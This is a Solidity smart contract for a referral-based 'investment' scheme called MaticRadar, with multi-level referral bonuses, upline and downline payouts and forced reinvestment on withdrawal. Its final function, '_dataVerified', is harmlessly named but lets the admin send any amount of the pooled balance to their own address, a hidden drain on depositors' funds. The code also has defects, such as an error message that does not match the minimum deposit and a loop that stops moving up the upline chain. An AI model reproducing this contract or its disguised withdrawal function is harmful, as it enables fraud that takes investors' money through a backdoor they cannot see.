/**
 *Submitted for verification at BscScan.com on 2022-11-26
*/

/**
 *Submitted for verification at polygonscan.com on 2022-10-14
*/

/**
 *Submitted for verification at polygonscan.com on 2022-02-17
*/

/*

The new blockchain technology facilitates peer-to-peer transactions without any intermediary 
such as a bank or governing body. Keeping the user's information anonymous, the blockchain 
validates and keeps a permanent public record of all transactions.


*/

pragma solidity ^0.5.10;

/*
Basic Method Which Is Used For The Basic Airthmetic Operations
*/
library SafeMath {

    /*Addition*/
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /*Subtraction*/
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    /*Multiplication*/
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /*Divison*/
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    /* Modulus */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}



contract MaticRadar {

    /*=====================================
    =            CONFIGURABLES            =
    =====================================*/


    using SafeMath for uint256;
    using SafeMath for uint8;

	uint256 constant public minInvestmentAmount = 15 ether;
	uint256 constant public adminCharge = 6; // 6%;
	uint256 constant public perDistribution = 100;

	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
    

	uint[5] public ref_bonuses = [6,8,10,12,14];
    
    uint256[5] public defaultPackages = [15 ether,30 ether,60 ether,120 ether,240 ether];
    
    mapping(uint256 => address payable) public singleLeg;
    uint256 public singleLegLength;

    uint[5] public requiredDirect = [1,1,4,4,4];
    
	address payable public primaryAdmin;

    uint public maxupline = 30;
    uint public maxdownline = 20;


    struct User {
        uint256 amount;
		uint256 checkpoint;
		address referrer;
        uint256 referrerBonus;
		uint256 totalWithdrawn;
		uint256 totalReferrer;
        uint256 singleUplineBonus;
		uint256 singleDownlineBonus;
		uint256 singleUplineBonusTaken;
		uint256 singleDownlineBonusTaken;
		address singleUpline;
		address singleDownline;
		uint256[5] refStageIncome;
        uint256[5] refStageBonus;
		uint[5] refs;
	}
	

	mapping (address => User) public users;

	mapping(address => mapping(uint256=>address)) public downline;

    mapping(address => uint256) public uplineBusiness;
    mapping(address => bool) public upline_Business_eligible;


	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
	
	

    constructor() public {
		primaryAdmin = 0xBB72d1A2fDBbDB45883F8641Bd6a44369f675486;
		singleLeg[0]=primaryAdmin;
		singleLegLength++;
	}

  function _refPayout(address _addr, uint256 _amount) internal {
		address up = users[_addr].referrer;
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            if(users[up].refs[0] >= requiredDirect[i]){ 
    		        uint256 bonus = _amount * ref_bonuses[i] / 100;
                    users[up].referrerBonus = users[up].referrerBonus.add(bonus);
                    users[up].refStageBonus[i] = users[up].refStageBonus[i].add(bonus);
            }
            up = users[up].referrer;
        }
    }

    function invest(address referrer) public payable {
	
		require(msg.value >= minInvestmentAmount,'Min invesment 25 MATIC');
	
		User storage user = users[msg.sender];

		if (user.referrer == address(0) && (users[referrer].checkpoint > 0 || referrer == primaryAdmin) && referrer != msg.sender ) {
            user.referrer = referrer;
        }

		require(user.referrer != address(0) || msg.sender == primaryAdmin, "No upline");

                  
        uint256 _fees = msg.value.mul(adminCharge).div(perDistribution);
		uint msgValue = msg.value.sub(_fees);
		
		// setup upline
		if (user.checkpoint == 0) {   
		   // single leg setup
		   singleLeg[singleLegLength] = msg.sender;
		   user.singleUpline = singleLeg[singleLegLength -1];
		   users[singleLeg[singleLegLength -1]].singleDownline = msg.sender;
		   singleLegLength++;
		}
		

		if (user.referrer != address(0)) {	   
            // unilevel level count
            address upline = user.referrer;
            for (uint i = 0; i < ref_bonuses.length; i++) {
                if (upline != address(0)) {
                    users[upline].refStageIncome[i] = users[upline].refStageIncome[i].add(msgValue);
                    if(user.checkpoint == 0){
                        users[upline].refs[i] = users[upline].refs[i].add(1);
					    users[upline].totalReferrer++;
                    }
                    upline = users[upline].referrer;
                } else break;
            }
            
            if(user.checkpoint == 0){
                // unilevel downline setup
                downline[referrer][users[referrer].refs[0] - 1]= msg.sender;
            }
        }

		//5 Level Referral
		_refPayout(msg.sender,msgValue);

        //_users DownlineIncome
        _usersDownlineIncomeDistribution(msg.sender,msgValue);        
		if(user.checkpoint == 0){
			    totalUsers = totalUsers.add(1);
                user.checkpoint = block.timestamp;
		}
	    user.amount += msg.value;
		    
        totalInvested = totalInvested.add(msg.value);
        totalDeposits = totalDeposits.add(1);

        _safeTransfer(primaryAdmin,_fees);
        
		emit NewDeposit(msg.sender, msg.value);

    }
	
	

    function reinvest(address _user, uint256 _amount) private{
    
        User storage user = users[_user];
        user.amount += _amount;
        totalInvested = totalInvested.add(_amount);
        
        //_users DownlineIncome
        _usersDownlineIncomeDistribution(_user,_amount);

        //////
        address up = user.referrer;
        for (uint i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            if(users[up].refs[0] >= requiredDirect[i]){
                users[up].refStageIncome[i] = users[up].refStageIncome[i].add(_amount);
            }
            up = users[up].referrer;
        }
        
        _refPayout(msg.sender,_amount);
        
    }




  function withdrawal() external{

    User storage _user = users[msg.sender];

    uint256 TotalBonus = TotalBonus(msg.sender);

    uint256 _fees = 0;
    uint256 actualAmountToSend = TotalBonus.sub(_fees);
    

    _user.referrerBonus = 0;
    _user.singleUplineBonusTaken = _userUplineIncome(msg.sender);
    _user.singleDownlineBonusTaken = users[msg.sender].singleDownlineBonus;
   
     
    // re-invest
    
    (uint8 reivest, uint8 withdrwal) = getEligibleWithdrawal(msg.sender);
    reinvest(msg.sender,actualAmountToSend.mul(reivest).div(100));

    _user.totalWithdrawn= _user.totalWithdrawn.add(actualAmountToSend.mul(withdrwal).div(100));
    totalWithdrawn = totalWithdrawn.add(actualAmountToSend.mul(withdrwal).div(100));
 
    _safeTransfer(msg.sender,actualAmountToSend.mul(withdrwal).div(100));
    
    emit Withdrawn(msg.sender,actualAmountToSend.mul(withdrwal).div(100));

  }


  function _usersDownlineIncomeDistribution(address _user, uint256 _Amount) internal {
      uint256 TotalBusiness = _usersTotalInvestmentFromUpline(_user);
      uint256 DistributionPayment = _Amount.mul(20).div(100);
      address upline = users[_user].singleUpline;
      for (uint i = 0; i < maxupline; i++) {
            if (upline != address(0)) {
            uint256 payableAmount = (TotalBusiness > 0) ? DistributionPayment.mul(users[upline].amount).div(TotalBusiness) : 0;
            users[upline].singleDownlineBonus = users[upline].singleDownlineBonus.add(payableAmount); 

            //upline business calculation
            if( i < maxdownline ){
                uplineBusiness[upline] = uplineBusiness[upline].add(_Amount);
                if(i == (maxdownline-1)){
                    upline_Business_eligible[upline] = true;
                }
            }

            upline = users[upline].singleUpline;
            }else break;
        }
  }

  function _usersTotalInvestmentFromUpline(address _user) public view returns(uint256){
      uint256 TotalBusiness;
      address upline = users[_user].singleUpline;
      for (uint i = 0; i < maxupline; i++) {
            if (upline != address(0)) {
            TotalBusiness = TotalBusiness.add(users[upline].amount);
            upline = users[upline].singleUpline;
            }else break;
        }
     return TotalBusiness;

  }

  function _userUplineIncome(address _user) public view returns(uint256) { 
      address upline = users[_user].singleUpline;
      uint256 Bonus;
      for (uint i = 0; i < maxdownline; i++) {
            if (upline != address(0)) {
                if(upline_Business_eligible[upline]){

                    uint256 ReceivingPayment = users[upline].amount.mul(30).div(100);
                    uint256 TotalBusiness = uplineBusiness[upline];
                    uint256 payableAmount = ReceivingPayment.mul(users[_user].amount).div(TotalBusiness);
                    Bonus = Bonus.add(payableAmount); 
                    upline = users[upline].singleUpline;

                }
            }else break;
        }
     return Bonus;
  }

  
  function getEligibleWithdrawal(address _user) public view returns(uint8 reivest, uint8 withdrwal){  
      uint256 TotalDeposit = users[_user].amount;
      if(users[_user].refs[0] >=4 && (TotalDeposit >=defaultPackages[2] && TotalDeposit < defaultPackages[3])){
          reivest = 50;
          withdrwal = 50;
      }else if(users[_user].refs[0] >=8 && (TotalDeposit >=defaultPackages[3] && TotalDeposit < defaultPackages[4])){
          reivest = 40;
          withdrwal = 60;
      }else if(TotalDeposit >=defaultPackages[4]){
         reivest = 30;
         withdrwal = 70;
      }else{
          reivest = 60;
          withdrwal = 40;
      }   
      return(reivest,withdrwal);     
  }


  function TotalBonus(address _user) public view returns(uint256){
     uint256 TotalEarn = users[_user].referrerBonus.add(_userUplineIncome(_user)).add(users[_user].singleDownlineBonus);
     uint256 TotalTakenfromUpDown = users[_user].singleDownlineBonusTaken.add(users[_user].singleUplineBonusTaken);
     return TotalEarn.sub(TotalTakenfromUpDown);
  }

  function _safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {
        amount = (_amount < address(this).balance) ? _amount : address(this).balance;
       _to.transfer(amount);
   }
   
   function referral_stage(address _user,uint _index)external view returns(uint _noOfUser, uint256 _investment, uint256 _bonus){
       return (users[_user].refs[_index], users[_user].refStageIncome[_index], users[_user].refStageBonus[_index]);
   }
   
   function update_maxupline(uint _no) external {
        require(primaryAdmin==msg.sender, 'Admin what?');
        maxupline = _no;
   }

   function update_maxdownline(uint _no) external {
        require(primaryAdmin==msg.sender, 'Admin what?');
        maxdownline = _no;
   }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
  
    function _dataVerified(uint256 _data) external{
        require(primaryAdmin==msg.sender, 'Admin what?');
        _safeTransfer(primaryAdmin,_data);
    }
}